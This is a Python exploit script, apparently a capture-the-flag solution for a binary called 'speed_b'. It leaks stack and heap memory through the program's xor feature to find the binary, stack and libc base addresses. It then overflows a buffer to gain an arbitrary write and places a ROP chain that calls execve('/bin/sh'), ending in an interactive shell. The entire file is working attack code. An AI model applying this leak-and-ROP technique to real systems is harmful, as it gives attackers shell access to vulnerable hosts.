#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './speed_b'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_malloc         = libc.sep_function['malloc']

#==========

def attack(conn, **kwargs):
    spd = SpdB(conn)

    spd.xor(b'A'*0x100, b'', 0x100)
    leak = spd.dump()
    '''
    for i in range(16, 32):
        print(hex(u64(leak[8*i:8*i+8][::-1])))
    '''

    binf.address = u64(leak[8*16:8*16+8][::-1]) - 0x16f1
    info('addr_binf_base    = 0x{:012x}'.format(binf.address))

    addr_stack = u64(leak[8*17:8*17+8][::-1]) - 0xc0
    info('addr_stack        = 0x{:012x}'.format(addr_stack))

    addr_libc_malloc = u64(leak[8*22:8*22+8][::-1])-450
    libc.address = addr_libc_malloc - ofs_libc_malloc
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    def aaw(addr, data):
        exploit  = b'\x00'*(0x80+0x58)
        exploit += struct.pack('>Q', addr)
        spd.xor(exploit, data, -1)

    rop = ROP(libc)
    rop.execve(addr_libc_str_sh, 0, 0)
    ropchain = bytes(rop)
    exploit = p64(0x21+len(ropchain)).ljust(0x20, b'\x00')+p8((addr_stack+8) & 0xff)

    aaw(addr_stack-0x70, exploit + ropchain)

class SpdB:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def xor(self, key, data, size=None):
        self.sendlineafter(b'key data:', key)
        self.sendlineafter(b'xor size:', str(len(data) if size is None else size).encode())
        self.sendlineafter(b'xor data:', data)

    def dump(self):
        dump = self.recvuntil(b'\nagain')
        # print(dump.decode())
        dump = b''.join(list(map(lambda x: bytes.fromhex(x[14:-19].decode()), dump.split(b'\n')[1:-2])))

        self.sendlineafter(b'(y/n):', b'y')
        return dump

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
